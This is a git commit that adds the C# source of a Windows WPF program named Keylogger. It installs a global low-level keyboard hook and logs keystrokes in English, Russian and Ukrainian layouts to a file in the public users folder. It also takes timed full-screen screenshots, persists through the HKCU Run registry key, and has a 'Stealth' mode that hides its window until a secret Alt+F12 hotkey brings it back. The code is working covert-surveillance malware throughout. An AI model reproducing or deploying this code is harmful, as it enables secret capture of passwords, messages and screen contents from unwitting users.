e11b0ffb3c7d0cea49b8f89cc28807d868498c64
NAZZIM <NAZZIM@NAZZIMPC>
2016-11-03 15:13:29 +0200

    Добавьте файлы проекта.

---
+++ Keylogger/Classes.cs
@@ -0,0 +1,384 @@
+﻿using System;
+using System.ComponentModel;
+using System.IO;
+using System.Text;
+using System.Windows;
+using System.Windows.Input;
+using System.Windows.Media.Imaging;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+using System.Drawing;
+using System.Globalization;
+using System.Windows.Interop;
+using System.Windows.Threading;
+
+
+namespace Keylogger
+{
+
+    #region AutoRun
+
+    public class AutoRun
+    {
+        public static bool SetAutoRun(bool autorun, string path)
+        {
+            const string name = "Keylogger";
+            string EXEpath = path;
+            RegistryKey reg;
+
+            //відкриваєм 
+            reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\");
+
+            try
+            {
+                if (autorun)
+                {
+                    try
+                    {
+                        reg.SetValue(name, EXEpath);
+                        //MessageBox.Show("AutoRun TRUE");
+                        //MessageBox.Show(Environment.OSVersion.ToString());
+                    }
+                    catch (NullReferenceException ex)
+                    {
+                        MessageBox.Show(ex.Message);
+                    }
+                }
+                else
+                {
+                    reg.DeleteValue(name);
+                    //MessageBox.Show("AutoRun FALSE");
+                }
+                reg.Flush();//
+                reg.Close();
+                //
+            }
+
+            catch
+            {
+                return false;
+            }
+
+            return true;
+        }
+
+        public static string Path()
+        {
+            int majorVer = Environment.OSVersion.Version.Major;
+            string path;
+            //MessageBox.Show(Environment.OSVersion.Version.Minor.ToString());
+            //Windows XP
+            string str = Environment.SystemDirectory.Remove(3);
+
+            //MessageBox.Show(str);
+            if (majorVer < 6)
+            {
+                path = str + @"Documents and Settings\All Users\";
+                return path;
+            }
+            else
+            {
+                path = str + @"Users\Public\";
+                return path;
+            }
+
+        }
+
+        //public static bool SetStealth;
+
+    }
+
+    #endregion
+
+    #region Keylogger
+      
+    internal class Keylog
+    {
+        private const int WH_KEYBOARD_LL = 13;
+
+        private StringBuilder sb = new StringBuilder();
+        private LowLevelKeyboardProcDelegate m_callback;
+        private IntPtr m_hHook;
+
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn,
+            IntPtr hMod, int dwThreadId);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("Kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(IntPtr lpModuleName);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(
+            IntPtr hhk,
+            int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static readonly char[] EKey = new char[] {'A', 'S', 'D', 'F', 'Q', 'W', 'E', 'R',
+            'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', 'G', 'H', 'J',  'K', 'L', ';', '\'',
+            '`', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/',
+            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' };
+        private static readonly char[] RKey = new char[] { 'Ф', 'Ы', 'В', 'А', 'Й', 'Ц', 'У', 'К', 'Е',
+            'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'П', 'Р', 'О', ' ', 'Л', 'Д', 'Ж', 'Э', 'Ё', 'Я',
+            'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
+            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
+        private  static readonly char[] UKey = new char[]{
+            'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ї', 'Ф', 'І', 'В', 'А', 'П',
+            'Р', 'О', 'Л', 'Д', 'Ж', 'Є', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', '.',
+            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0'};
+
+        private IntPtr LowLevelKeyboardHookProc(
+            int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode < 0)
+            {
+                return CallNextHookEx(m_hHook, nCode, wParam, lParam);
+            }
+            else
+            {
+                var khs = (KeyboardHookStruct)
+                          Marshal.PtrToStructure(lParam,
+                          typeof(KeyboardHookStruct));
+
+                //Debug.Print("Hook: Code: {0}, WParam: {1},{2},{3},{4} ",
+                //            nCode, wParam, lParam,
+                //            khs.VirtualKeyCode,
+                //            khs.ScanCode, khs.Flags, khs.Time);
+                
+
+                //Debug.Print(khs.VirtualKeyCode.ToString());
+                //MessageBox.Show(khs.VirtualKeyCode.ToString());
+                FileStream fs = null;
+                FileInfo fi = null;
+                StreamWriter sw = null;
+                string ilm = InputLanguageManager.Current.CurrentInputLanguage.ToString();
+                
+                try
+                {
+                    fi = new FileInfo(AutoRun.Path() + "Key.txt");
+                    fs = fi.Open(FileMode.OpenOrCreate, FileAccess.Write, FileShare.Write);
+                    sw = new StreamWriter(fs);
+                    //MessageBox.Show(ilm);
+                    //string str = khs.VirtualKeyCode.ToString();
+                    if (ilm == "en-US")
+                    {
+                        for (int i = 0; i < EKey.Length; i++)
+                        {
+                            //MessageBox.Show("ENG");
+                            if (khs.VirtualKeyCode == EKey[i])
+                            {
+                               // MessageBox.Show("EKEY: " + EKey[i] + "VKC: " + khs.VirtualKeyCode);
+                                sw.WriteLine(sb.Append(EKey[i]));
+                            }
+                        }
+                    }
+                    else if (ilm == "ru-RU")
+                    {
+                        for (int i = 0; i < RKey.Length; i++)
+                        {
+                            
+                            if (khs.VirtualKeyCode == RKey[i])
+                                sw.WriteLine(sb.Append(RKey[i]));
+                        }
+                    }
+                    else if(ilm == "uk-UA")
+                    {
+                        for (int i = 0; i < UKey.Length; i++)
+                        {
+                            //MessageBox.Show("UKEY: " + UKey[i] + "VKC: " + khs.VirtualKeyCode);
+                            if (khs.VirtualKeyCode == UKey[i])
+                            {
+                                sw.WriteLine(sb.Append(UKey[i]));
+                                //MessageBox.Show("UKR"); не працює
+                            }
+                        }
+                    }
+
+                }
+
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.ToString());
+                }
+
+                finally
+                {
+                    sw.Close();
+                }
+
+                return CallNextHookEx(m_hHook, nCode, wParam, lParam);
+
+                //if (khs.VirtualKeyCode == 9 &&
+                //    wParam.ToInt32() == 260 &&
+                //    khs.ScanCode == 15) //alt+tab
+                //{
+
+                //    System.Console.WriteLine("Alt+Tab pressed!");
+                //    IntPtr val = new IntPtr(1);
+                //    return val;
+                //}
+                //else
+                //{
+                //    return CallNextHookEx(m_hHook, nCode, wParam, lParam);
+                //}
+
+            }
+        }
+
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KeyboardHookStruct
+        {
+            public readonly int VirtualKeyCode;
+            public readonly int ScanCode;
+            public readonly int Flags;
+            public readonly int Time;
+            public readonly IntPtr ExtraInfo;
+        }
+
+
+        private delegate IntPtr LowLevelKeyboardProcDelegate(
+            int nCode, IntPtr wParam, IntPtr lParam);
+
+
+        public void SetHook()
+        {
+            m_callback = LowLevelKeyboardHookProc;
+            m_hHook = SetWindowsHookEx(WH_KEYBOARD_LL,
+                m_callback,
+                GetModuleHandle(IntPtr.Zero), 0);
+        }
+
+
+        public void Unhook()
+        {
+            UnhookWindowsHookEx(m_hHook);
+        }
+
+
+    }
+#endregion
+
+    #region ScreenShot
+
+    static class BMP
+    {
+        [DllImport("gdi32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        internal static extern bool DeleteObject(IntPtr hObject);
+
+        public static BitmapSource ToBitmapSource(this System.Drawing.Bitmap source)
+        {
+            var hBitmap = source.GetHbitmap();
+
+            try
+            {
+                return System.Windows.Interop.Imaging.CreateBitmapSourceFromHBitmap(
+                    hBitmap,
+                    IntPtr.Zero,
+                    Int32Rect.Empty,
+                    BitmapSizeOptions.FromEmptyOptions());
+            }
+            catch (Win32Exception)
+            {
+                return null;
+            }
+            finally
+            {
+                //NativeMethods.DeleteObject(hBitmap);
+            }
+        }
+    }
+
+    public static class ScreenShot
+    {
+        
+        static BitmapEncoder bitmapenc;
+        static BitmapSource bitmapsource;
+        static JpegBitmapEncoder jpeg;
+
+        [System.Runtime.InteropServices.DllImport("gdi32.dll")]
+        public static extern bool DeleteObject(IntPtr onj);
+
+        private static BitmapSource TakeScreen()
+        {
+
+
+            Bitmap bitmap;
+            BitmapSource bitmapsource = null;
+
+            bitmap = new Bitmap((int) SystemParameters.PrimaryScreenWidth, (int) SystemParameters.PrimaryScreenHeight,
+               System.Drawing.Imaging.PixelFormat.Format32bppArgb);
+
+            using (Graphics g = Graphics.FromImage(bitmap))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            }
+            IntPtr handle = IntPtr.Zero;
+            try
+            {
+                handle = bitmap.GetHbitmap();
+                bitmapsource = Imaging.CreateBitmapSourceFromHBitmap(handle, IntPtr.Zero, Int32Rect.Empty,
+                    BitmapSizeOptions.FromEmptyOptions());
+
+            }
+            catch (Exception)
+            {
+
+            }
+
+            finally
+            {
+                DeleteObject(handle);
+            }
+
+            return bitmapsource;
+
+        }
+
+        public static void ScreenSave(string numscreen)
+        {
+            string path = AutoRun.Path() + numscreen + ".jpg";
+            bitmapsource = ScreenShot.TakeScreen();
+            jpeg = new JpegBitmapEncoder();
+            jpeg.Frames.Add(BitmapFrame.Create(bitmapsource));
+            FileStream fs = null;
+
+            try
+            {
+                fs= new FileStream(path,FileMode.Create, FileAccess.Write);
+                jpeg.Save(fs);
+            }
+
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+
+            finally
+            {
+                fs.Close();
+            }
+        }
+
+    }
+
+#endregion
+
+    public enum WindowsHotKey
+    {
+        Alt = 0x0001,
+        Ctrl = 0x0002,
+        Shift = 0x0004,
+        V = 0x56,
+        F12 = 0x7B,
+        ESC = 0x1B,
+        None = 0x0
+    }
+
+    
+
+
+}
---
+++ Keylogger/MainWindow.xaml.cs
@@ -0,0 +1,213 @@
+﻿using System;
+using System.Windows;
+using System.Windows.Controls;
+using System.Runtime.InteropServices;
+using System.Windows.Interop;
+using System.Windows.Threading;
+
+
+
+namespace Keylogger
+{
+    /// <summary>
+    /// Логика взаимодействия для MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        #region WinAPI
+        //[DllImport("user32.dll")]
+        //private static extern IntPtr FindWindow(string sClassName, string sAppName );
+
+        [DllImport("user32.dll")]
+        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModiefier, uint vk);
+
+        [DllImport("user32.dll")]
+        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
+        #endregion
+
+        DispatcherTimer timer = new DispatcherTimer();
+        Keylog keylog = new Keylog();
+
+
+        public MainWindow()
+        {
+            InitializeComponent();
+
+            txtNum.Text = _numValue.ToString();
+
+            timer.Tick += new EventHandler(timer_tick);
+            timer.Interval = new TimeSpan(0,0,1);
+            timer.Start();
+            
+
+        }
+        
+        #region HotKey
+        private const int HOTKEY_ID = 9000;
+        private IntPtr _windowHandle;
+        private HwndSource _source;
+
+        protected override void OnSourceInitialized(EventArgs e)
+        {
+            base.OnSourceInitialized(e);
+
+            _windowHandle = new WindowInteropHelper(this).Handle;
+            _source = HwndSource.FromHwnd(_windowHandle);
+            _source.AddHook(HwndHook);
+            
+
+            RegisterHotKey(_windowHandle, HOTKEY_ID, (uint)WindowsHotKey.Alt, (uint)WindowsHotKey.F12); //Alt + F12
+        }
+        //(uint)WindowsHotKey.Alt
+        private IntPtr HwndHook(IntPtr hwnd, int msg, IntPtr wParam, IntPtr lParam, ref bool handled)
+        {
+            //HookDemoHelper hookDemoHelper = new HookDemoHelper();
+            
+            const int WM_HOTKEY = 0x0312;
+            switch (msg)
+            {
+               
+                case WM_HOTKEY:
+                    switch (wParam.ToInt32())
+                    {
+                        case HOTKEY_ID:
+                           
+                            int vkey = (((int)lParam >> 16) & 0xFFFF);
+                            if (vkey == (uint)WindowsHotKey.F12 )
+                            {
+                                Application.Current.MainWindow.Visibility = Visibility.Visible;
+                            }
+                            handled = true;
+                            break;
+                    }
+                    break;
+            }
+            return IntPtr.Zero;
+        }
+
+        protected override void OnClosed(EventArgs e)
+        {
+            _source.RemoveHook(HwndHook);
+            UnregisterHotKey(_windowHandle, HOTKEY_ID);
+            base.OnClosed(e);
+        }
+
+        #endregion
+        
+        #region Timer
+
+        private int time = 0;
+        private void timer_tick(object sender, EventArgs e)
+        {
+            time++;
+            labeltime.Content = time.ToString();
+            
+            if (_numValue >= 1)
+            {
+                //MessageBox.Show(" ScreenShot Time ");
+                if (_numValue * 60 == time)
+                {
+                    time = 0;
+                    string str = DateTime.Now.ToString().Replace(':', '_');
+                    ScreenShot.ScreenSave(str);
+
+                }
+            }
+            else
+            {
+                time = 0;
+            }
+        }
+
+        private int _numValue = 0;
+
+        public int NumValue
+        {
+            get { return _numValue; }
+            set
+            {
+                _numValue = value;
+                txtNum.Text = value.ToString();
+            }
+        }
+
+        
+
+        private void cmdUp_Click(object sender, RoutedEventArgs e)
+        {
+            NumValue++;
+            if (NumValue >= 60) NumValue = 60;
+        }
+
+        private void cmdDown_Click(object sender, RoutedEventArgs e)
+        {
+           NumValue--;
+           if (NumValue <=0) NumValue = 0;
+        }
+
+        private void txtNum_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            if (txtNum == null)
+            {
+                return;
+            }
+
+            if (!int.TryParse(txtNum.Text, out _numValue))
+                txtNum.Text = _numValue.ToString();
+        }
+
+
+        #endregion
+
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            CheckAuto.IsChecked = Properties.Settings.Default.AutoRunProp;
+            CheckStealth.IsChecked = Properties.Settings.Default.StealthProp;
+            txtNum.Text = Properties.Settings.Default.txtNumTimerProp;
+
+            //IntPtr thisWindow = FindWindow(null, "MainWindow");
+            //RegistryHotKey(thisWindow, 1, (uint)WindowsHotKey.Ctrl , (uint)Key.V);
+        }
+
+        private void Window_Closed(object sender, EventArgs e)
+        {
+            Properties.Settings.Default.AutoRunProp = (CheckAuto.IsChecked == true);
+            Properties.Settings.Default.StealthProp = (CheckStealth.IsChecked == true);
+            Properties.Settings.Default.txtNumTimerProp = txtNum.Text;
+            Properties.Settings.Default.Save();
+        }
+
+
+         
+
+     private void AutoRun_Check(object sender, RoutedEventArgs e)
+     {
+         AutoRun.SetAutoRun(true, AutoRun.Path() + "Keylogger.exe"); 
+     }
+
+     private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
+     {
+         AutoRun.SetAutoRun(false, AutoRun.Path() + "Keylogger.exe");
+     }
+
+
+     private void Stealth_Checked(object sender, RoutedEventArgs e)
+        {
+            Application.Current.MainWindow.Visibility = Visibility.Hidden;
+            keylog.SetHook();
+        }
+
+     private void Stealth_Unchecked(object sender, RoutedEventArgs e)
+        {
+            Application.Current.MainWindow.Visibility = Visibility.Visible;
+            keylog.Unhook();
+        }
+
+        private void tblock_TextChanged(object sender, TextChangedEventArgs e)
+        {
+
+        }
+
+        
+    }
+}
